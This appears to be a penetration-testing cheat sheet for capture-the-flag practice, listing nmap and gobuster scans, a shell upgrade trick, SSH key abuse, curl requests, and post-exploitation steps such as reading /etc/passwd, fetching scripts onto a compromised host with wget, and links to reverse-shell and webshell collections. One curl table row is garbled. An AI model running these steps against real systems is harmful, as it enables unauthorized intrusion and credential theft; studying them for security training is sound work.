# Basement Kids

Basement kids in their free time (always) are very creative and come up with this jar of tricks. We open 1 lock per 10 tips

## Nmap 

```
# Basic scan
nmap [IP]

# Now a deep scan on the open ports
nmap -sC -sV [IP] -pP1,P2,P3

# A full scan for hidden ports
nmap -sV -sC -p- -oN [FILE] [IP]

# Other useful scan
nmap -p- -sV -sC -A --min-rate 1000 --max-retries 5 -oN [FILE] [IP]

# With nse scripts
nmap -pP1 --script vun [IP]
```

Find the nse scripts in `/usr/share/nmap/scripts/`

More on nmap cheatsheet [here](https://www.tutorialspoint.com/nmap-cheat-sheet)

## Gobuster

Gobuster can bruteforce 3 things:

1. Dirs & files
    * `gobuster dir -u <url> -w <wordlist_file.txt> -x <file_extensions>`
2. DNS subdomains
    * `gobuster vhost -v -w <wordlist.txt> -u <url> -o <output_file.txt>`
3. Subdomains in a specific domain
    * `gobuster dns -d <domain> -w <word_list.txt> -i`

## Upgrading TTY

```
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
$ ^Z

$ stty raw -echo
$ fg

[Enter]
[Enter]
www-data@remotehost$ echo "upgraded TTY"
```

## SSH Keys

* If you have write access to `.authorized_keys` in remote machine
    1. Write your public key to this file
    2. Login with your passwd: `ssh user@remotehost`

* If you have read access to user's private key in remote machine
    1. Copy the `priv_key` to your machine
    2. Change permissions: `chmod 600`
    3. Login with this key: `ssh -i [priv_key] [IP]`

## Curl

| **Command** | **Description** |
| --------------|-------------------|
| `curl http://inlanefreight.com -v` | GET request with `cURL`, verbose |
| `curl http://inlanefreight.com -I` | GET headers only `cURL` |
| `curl http://admin:password@inlanefreight.com/ -vvv` | `cURL` Basic Auth login |
| `curl -u admin:password  http://inlanefreight.com/ -vvv` | Alternate `cURL` Basic Auth login |
| `curl -u admin:password -L http://inlanefreight.com/` | `cURL` Basic Auth login, follow redirection |
| `curl -u admin:password 'http://inlanefreight.com/search.php?port_code=us'` | `cURL` GET request with parameter |
| `curl -d 'username=admin&password=password' -L http://inlanefreight.com/login.php` | POST request with `cURL` |
| `curl -d 'username=admin&password=password' -L  http://inlanefreight.com/login.php -v` inlanefreight.com/login.php` | `cURL` with cookie file |
| `curl -H 'Content-Type: application/json' -d '{ "username" : "admin", "password" : "password" }'` | `cURL` specify content type |
| `curl -X OPTIONS http://inlanefreight.com/ -vv` | `cURL` OPTIONS request |
| `curl -X PUT -d @test.txt http://inlanefreight.com/test.txt -vv` | File upload with `cURL` |
| `curl -X DELETE http://inlanefreight.com/test.txt -vv` | DELETE method with `cURL` |

More on curl cheatsheet: https://devhints.io/curl

## Misc

When in the shell:

* Check the id and groups:
    * `id`
* Check the sudo permissions:
    * `sudo -l`
* Search for users:
    * `cat /etc/passwd`
* Transfer files from local to remote (or vica versa):
    * In local machine: `python -m http.server 6969`
    * In remote machine: `wget http://localIP:6969/file.sh`
* Check for read/write permission on `.ssh` dirs and files
* Check for backups, if read permissions
    * Read archives without extraction: `zcat archive.tar.gz`
* Check for permission on `cron.d` and `cron.daily`
* Running shell commands in vim:
    * `:!cat /etc/passwd`
* If no passwd sudo on binaries, check [GTFO bins](https://gtfobins.github.io/)

* [CyberChef](https://gchq.github.io/CyberChef/)

## Wordlists & webshell

* [Dirb wordlist](https://github.com/v0re/dirb/tree/master/wordlists)
* [Dirbuster wordlist](https://github.com/daviddias/node-dirbuster/tree/master/lists)
* [SecLists](https://github.com/danielmiessler/SecLists)
* [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
* [Reverse shell Cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
* [PHP webshell](https://github.com/tutorial0/WebShell/blob/master/Php/php-reverse-shell.php)






